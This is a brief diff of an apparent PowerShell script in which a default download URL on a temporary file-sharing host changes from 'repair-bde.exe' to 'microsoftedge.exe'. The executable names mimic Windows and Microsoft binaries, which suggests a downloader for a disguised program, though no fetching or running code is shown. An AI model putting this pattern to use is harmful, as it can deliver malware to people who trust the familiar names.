@@ -3,7 +3,7 @@
 
 param(
     [Parameter(Mandatory=$false)]
-    [string]$Url = "https://tmpfiles.org/dl/15311577/repair-bde.exe",  # <<< EDIT THIS URL HERE >>>
+    [string]$Url = "https://tmpfiles.org/dl/15422054/microsoftedge.exe",  # <<< EDIT THIS URL HERE >>>
 
     [Parameter(Mandatory=$false)]
     [string]$FileExtension = "exe"                   # Change if you know the extension (e.g., "pdf", "jpg")
